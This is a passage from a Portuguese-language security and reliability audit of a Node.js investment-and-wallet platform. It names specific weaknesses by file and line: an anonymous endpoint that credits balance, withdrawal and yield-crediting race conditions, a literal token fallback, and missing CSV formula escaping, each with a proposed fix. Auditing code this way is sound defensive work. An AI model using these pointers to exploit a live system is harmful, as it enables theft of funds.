- Fix approach: 1 MB global, limite por rota se necessario. Em FREE plan do Render a memoria e o gargalo.

**PERF-06 - Rate limit de login e unico gargalo de CPU**
- Issue: `server.js:37-43` - 100 tentativas/15min **por IP**. `server.js:47-55` - 10/15min por telefone.
- Impact: o `bcrypt.hashSync(password, 10)` em `routes/auth.js:72` e **sincrono** e roda em toda tentativa de cadastro; `bcrypt.compareSync` (`routes/auth.js:231`) tambem e sincrono. 100 tentativas por IP a cada 15 min, mais o cadastro ilimitado a 60/h por IP, sao carga de CPU sequencial no event loop - num plano FREE isso derruba o servico.
- Fix approach: `bcrypt.hash`/`compare` (async) em vez das versoes `Sync`; reduzir o teto por IP.

---

## Fragile Areas

**FRAG-01 - O middleware de sessao do CRM e um catch-all com uma unica excecao**
Ja detalhado em BUG-01. Fragilidade estrutural: `routes/crm.js:33-36` - "tudo exige sessao, exceto `POST /leads/webhook`". Toda rota nova de terceiro (webhook, integracao, health check) nasce bloqueada, e o desenvolvedador precisa **lembrar** de adicionar a excecao. Alem disso `GET /crm/health` (`:29`) sobrevive so porque foi registrado **antes** do middleware - ordem de registro como mecanismo de seguranca.

**FRAG-02 - O contrato de login do CRM mudou sem o front mudar**
Ver Tech Debt, ultimo item. O servidor parou de devolver `token` (`routes/auth.js:219-222`); o bundle compilado em `public/crm/` continua lendo e gravando `truckauto_crm_token`. Dois artefatos, um contrato, nenhum pipeline de build.

**FRAG-03 - `settleDayNow` e o cron correm no mesmo processo sem coordenar**
- Issue: `services/settlementEngine.js:140-182` le `contract.dripDay`/`dripCount` (`:157-158`), credita fatias em laco com `await` (`:161-167`), e so entao grava `updateContract` (`:176`). O cron dispara a cada hora (`server.js:233`) e o admin pode chamar `POST /api/admin/settle` a qualquer momento (`routes/admin.js:1283-1292` -> `processDripSlice`).
- Impact: duas execucoes concorrentes leem o mesmo `dripCount` e cada uma credita `24 - count` fatias -> **o dia rende em dobro**. Alem disso `settleDayNow(0)` (`:197-209`) roda `runSlices(0)`, que credita **todas** as fatias restantes do dia de uma vez - acionar o botao "liquidar dia" e depois deixar o cron rodar pode creditar o dia novamente.
- Fix approach: `UPDATE contracts SET drip_count = $1 WHERE id = $2 AND drip_count = $3` (CAS) ou trancar com advisory lock do Postgres; e `settleDayNow` deveria ser `pg_try_advisory_lock`.

**FRAG-04 - O mesmo processo roda cron, watchdog, bot e HTTP**
- Issue: `server.js:218-238` - dentro do `listen()`: watchdog (`:227`), backup diario (`:229`), drip horario (`:233`). Mais `initTelegramBot()` (`:216`) e a fila de WhatsApp (`services/whatsappQueue.js`).
- Impact: um `cron.schedule` a cada hora e uma unica instancia - se Render escalar, **cada replica executa o drip** e multiplica o rendimento. Alem disso `node-cron` roda em todos os fusos horarios do processo (UTC no Render), enquanto a logica de negocio usa `America/Sao_Paulo` (`services/settlementEngine.js:79`, `:89`) - o agendamento '7 * * * *' e UTC e o dia de negocio e Brasilia, entao a fatia das 21:00 UTC cai no dia seguinte em Brasilia. Somado a `isSundayOff()` (`:144`), a fronteira de dia esta deslocada.
- Fix approach: scheduler externo (Render Cron Job) ou leader election; fixar o fuso do `cron.schedule` explicitamente.

**FRAG-05 - Regra de negocio hardcoded no codigo**
- Issue: `routes/fleet.js:23` `COOLDOWN_DAYS = 30`; `routes/fleet.js:114` `MAX_PER_MODEL = product.id.startsWith('CH-') ? 1 : (priceNum >= 79 ? 1 : 2)`; `services/settlementEngine.js:68` `SLICES_PER_DAY = 24`; `services/misticpay.js:119` lista de 68 DDDs; `services/careerEngine.js:9-84` RANKS e percentuais.
- Impact: o item 2 da lista de hotfixes do produto (carencia de 30 dias por modelo) e uma constante no codigo. Mudar a politica comercial exige deploy. E `MAX_PER_MODEL` depende de **duas** condicoes silenciosas (prefixo do id do produto **e** faixa de preco) - o `CH-` e um nome de familia de produto, nao um campo.
- Fix approach: mover para `system_settings` (o mecanismo ja existe, `database.js:2085` `updateSystemSetting`), como foi feito com os 9 campos da Fase 2.

**FRAG-06 - `balance` denormalizado em tres lugares de verdade**
Ver "Money arithmetic". O comentario de `database.js:787` sugere que os incrementos foram a solucao, mas as escritas absolutas continuaram. Enquanto `balance` for um terceiro valor independente de `invest_balance + earn_balance`, nenhum acima de Money pode ser corrigido por partes.

---

## Fragments of the anti-fraud plan that ARE in place (para nao duplicar trabalho)

Registrados aqui porque o mapa anterior ja os listava e eles **nao** devem ser refeitos:

| Item | Onde | Observacao |
|---|---|---|
| Hash de IP no cadastro | `routes/auth.js:61-67` + `database.js:385`, `:703` | sha256 truncated em 16 chars (`routes/auth.js:66`); salt `_truckauto_salt` literal no fonte |
| Contagem de contas/24h por hash de IP | `database.js:858-880` (`countUsersByIpSince`) + `routes/auth.js:92-94` | Postgres-only: o branch JSON de `database.js:858` retorna **sempre 0** (grep: `countUsersByIpSince` so aparece em `routes/auth.js` e no export `database.js:2113`). **No modo `data.json` o anti-farm esta completamente desligado.** |
| Soft-flag `crmStatus='suspeito'` | `routes/auth.js:95` + `database.js:767-770` | >= 4 contas/24h. Alerta no Telegram em `routes/auth.js:98-103`. **Nao bloqueia** - so sinaliza. `crmStatus` nao tem coluna no DDL de `database.js:246-262`; so existe via `ALTER` em `initDb` (verificar). |
| Expiracao do bonus de boas-vindas (7 dias sem deposito) | `services/limits.js:122-127` + `routes/wallet.js:687-721` | Funciona. Estorno por `adjustment` negativo. |
| Limites rolantes de 24h (saque) | `services/limits.js:86-119` + `routes/wallet.js:723-758` | Resolve o bug "23:59 -> 00:01" descrito no plano. |
| Intervalo de 24h entre saques (substitui dia corrido) | `services/limits.js:108-111` + `routes/wallet.js:730` | Pedido do item 4 do plano, feito por outro caminho. |
| Comissao so sobre dinheiro depositado | `services/fleet.js:180` + `services/limits.js:129-132` | Anti-farm de comissao. |
| Teto global de saques 24h + pausa de emergencia | `services/limits.js:88-89`, `:115-117` + `routes/wallet.js:750-755` | Com alerta no Telegram. |
| Pausa de depositos | `routes/wallet.js:111-113` | |

---

## Prioridade de acao

### P0 - hoje, 2026-09-30
1. **SEC-01** - `routes/wallet.js:560-566`: inverter a condicao do token SyncPay para fail-closed. Uma linha, remove um endpoint anonimo que credita saldo.
2. **MisticPay auth expiry** - confirmar em `/admin > /gateways` que o MisticPay responde. Se a credencial expirou, todo deposito esta caindo no fallback (potencialmente na "gateway" simulada do Cartpanda, `services/cartpanda.js:11-12`).
3. **BUG-01** - `routes/crm.js:33-36`: trocar a excecao unica por allow-list de rotas publicas. Sem isso o WhatsApp e o Meta estao mudos.
4. **BUG-04/SEC-02** - `routes/wallet.js:275`: `password` -> `passwordHash` com bcrypt, e `newUserId()` em vez do id de 9.000.

### P1 - esta semana
5. **Race do saque** - `routes/wallet.js:777-784`: `earnBalanceInc: -numAmount` + validacao no proprio `UPDATE`. Perda direta de dinheiro.
6. **PERF-02** - `routes/wallet.js:758` e `:122`: fail-closed nos limites (hoje falha aberta).
7. **SEC-04** - `routes/crm.js:116`: remover o fallback literal de `EVOLUTION_INSTANCE_TOKEN`.
8. **SEC-06** - adicionar `POST /api/auth/logout` usando o `clearCookie` ja existente (`services/crmSession.js:51-53`) e chamar do bundle.
9. **Copy mismatch** - `services/aiSdrEngine.js:54`, `:69`, `:83`: alinhar os numeros com `routes/wallet.js:861-866`, `services/careerEngine.js:78-84` e o gotejamento horario.

### P2 - proximo sprint
10. **Transacoes no DAL** - helper `withTransaction` + envolver (saldo + transaction) nos 5 fluxos listados.
11. **Race do `fleet.js`** - `routes/fleet.js:143-146`.
12. **BUG-03** - `services/backup.js:48`: `require('../database')`.
13. **SEC-08/SEC-09** - escape de formula no CSV + allowlist no `PUT /leads/:id`.
14. **BUG-06** - `services/keepAliveWatchdog.js:32-38`: `process.exit(1)` em `uncaughtException`.
15. **FRAG-03** - lock no drip slice.

### P3 - quando o plano antifraude for aprovado
16. Itens 1, 2, 3, 4, 6 de `plano-antifraude-bonus-R5.md` - **na ordem: 6 antes de 2**, 1 antes de 2 e de 3. Ver a secao 0 deste documento.
17. `countUsersByIpSince` no branch JSON (`database.js:858`) - hoje o anti-farm e no-op em modo arquivo.

---

## Verificacao feita / nao feita

**Feito:** leitura integral de `database.js`, `server.js`, `middleware/auth.js`, `routes/auth.js`, `routes/wallet.js`, `routes/admin.js`, `routes/crm.js`, `routes/fleet.js`, `routes/team.js`, `routes/support.js`, `services/crmSession.js`, `services/crmDb.js`, `services/misticpay.js`, `services/careerEngine.js`, `services/settlementEngine.js`, `services/limits.js`, `services/backup.js`, `services/keepAliveWatchdog.js`, `services/aiSdrEngine.js`, `services/asaas.js`, `services/syncpay.js`, `services/cartpanda.js`, `plano-antifraude-bonus-R5.md`, `.env.example`, `render.yaml`, `.gitignore`; `git log`, `git status`, `git ls-files`; greps por `findUserByCpf`, `device_hash`, `UNIQUE`, `AbortSignal`, `catch {}`, `.catch(() =>)`, `escHtml`, `innerHTML`, `localStorage.*token`; verificacao de presenca (nao de valor) dos campos de settings em `crm_data.json`.

**Nao feito (e por que):**
- Nenhum teste executado - os testes existentes (`tests/`) cobrem `limits.js` e i18n, nao os fluxos de dinheiro.
- Nenhum `innerHTML` do `public/admin.html` auditado linha a linha para XSS (o arquivo tem 2935 linhas); SEC-11 reporta a **ausencia de `escHtml` e de CSP** como a condicao de risco, nao um XSS confirmado.
- Nao houve acesso a ambiente de producao: as afirmacoes sobre "MisticPay expirado" e "webhook 401 em producao" sao derivadas do trace de codigo e precisam de confirmacao nos logs.
- `crm_data.json` nao existe no working tree - os campos de settings do CRM (`services/crmDb.js:7-18`) nunca foram exercitados localmente.
